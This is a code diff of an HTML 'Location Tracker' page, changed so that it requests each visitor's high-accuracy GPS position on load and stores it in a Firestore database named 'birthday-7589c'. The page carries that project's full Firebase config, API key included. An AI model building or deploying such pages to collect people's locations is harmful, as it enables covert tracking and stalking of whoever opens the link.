@@ -2,157 +2,61 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Location Tracker</title>
-
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
 <style>
-html,body{
-    margin:0;
-    padding:0;
-    height:100%;
-}
-#map{
-    height:100%;
-}
-.info{
-    position:absolute;
-    top:10px;
-    left:10px;
-    z-index:1000;
-    background:white;
-    padding:10px;
-    border-radius:8px;
-    box-shadow:0 0 10px rgba(0,0,0,.3);
-    max-width:300px;
-    font-family:Arial,sans-serif;
-}
-button{
-    padding:10px 15px;
-    background:#007bff;
-    color:#fff;
-    border:none;
-    border-radius:5px;
-}
+html,body,#map{height:100%;margin:0}
+#panel{position:absolute;z-index:1000;top:10px;left:10px;background:#fff;padding:10px;border-radius:8px;max-width:320px;font-family:Arial}
 </style>
-
 </head>
 <body>
-
-<div class="info">
-<button onclick="getLocation()">Refresh Location</button>
-<div id="status">Getting your location...</div>
-</div>
-
+<div id="panel">Requesting location...<div id="status"></div></div>
 <div id="map"></div>
 
-<script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDhdCaU4SyFYxkZZma1q7xUuFu_fgnu3JQ",
+  authDomain: "birthday-7589c.firebaseapp.com",
+  projectId: "birthday-7589c",
+  storageBucket: "birthday-7589c.firebasestorage.app",
+  messagingSenderId: "325902180878",
+  appId: "1:325902180878:web:4f96cb7364dd58990b925f",
+  measurementId: "G-TWLQRMSWBY"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
 const map=L.map('map').setView([20.5937,78.9629],5);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
 
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
-attribution:'© OpenStreetMap'
-}).addTo(map);
+const status=document.getElementById("status");
 
-let marker;
-let circle;
-let retry=false;
+navigator.geolocation.getCurrentPosition(async (pos)=>{
+ const {latitude,longitude,accuracy}=pos.coords;
+ L.marker([latitude,longitude]).addTo(map).bindPopup("Current Location").openPopup();
+ L.circle([latitude,longitude],{radius:accuracy}).addTo(map);
+ map.setView([latitude,longitude],17);
 
-function getLocation(){
+ status.innerHTML=`Latitude: ${latitude}<br>Longitude: ${longitude}<br>Accuracy: ${accuracy.toFixed(1)} m`;
 
-document.getElementById("status").innerHTML="Finding GPS location...";
-
-navigator.geolocation.getCurrentPosition(
-
-success,
-
-function(error){
-
-if(error.code===3 && !retry){
-retry=true;
-document.getElementById("status").innerHTML="Retrying...";
-setTimeout(getLocation,2000);
-return;
-}
-
-let msg="";
-
-switch(error.code){
-
-case 1:
-msg="Permission denied.";
-break;
-
-case 2:
-msg="Location unavailable.";
-break;
-
-case 3:
-msg="GPS timeout. Move outdoors and try again.";
-break;
-
-default:
-msg=error.message;
-
-}
-
-document.getElementById("status").innerHTML=msg;
-
-},
-
-{
-
-enableHighAccuracy:true,
-timeout:30000,
-maximumAge:0
-
-}
-
-);
-
-}
-
-function success(position){
-
-retry=false;
-
-const lat=position.coords.latitude;
-const lon=position.coords.longitude;
-const accuracy=position.coords.accuracy;
-
-if(marker) map.removeLayer(marker);
-if(circle) map.removeLayer(circle);
-
-marker=L.marker([lat,lon]).addTo(map);
-
-circle=L.circle([lat,lon],{
-radius:accuracy
-}).addTo(map);
-
-map.setView([lat,lon],18);
-
-marker.bindPopup("Current Location").openPopup();
-
-document.getElementById("status").innerHTML=
-`
-<b>Latitude:</b> ${lat}<br>
-<b>Longitude:</b> ${lon}<br>
-<b>Accuracy:</b> ${accuracy.toFixed(1)} meters<br><br>
-
-<a target="_blank"
-href="https://www.google.com/maps?q=${lat},${lon}">
-Open in Google Maps
-</a>
-`;
-
-}
-
-// Automatically request location when page loads
-window.onload=getLocation;
-
+ try{
+   await addDoc(collection(db,"locations"),{
+      latitude, longitude, accuracy,
+      createdAt: serverTimestamp()
+   });
+   status.innerHTML += "<br><b>Saved to Firestore ✔</b>";
+ }catch(e){
+   status.innerHTML += "<br><b>Firestore error:</b> "+e.message;
+ }
+},(err)=>{
+ status.textContent="Location error: "+err.message;
+},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
 </script>
-
 </body>
 </html>
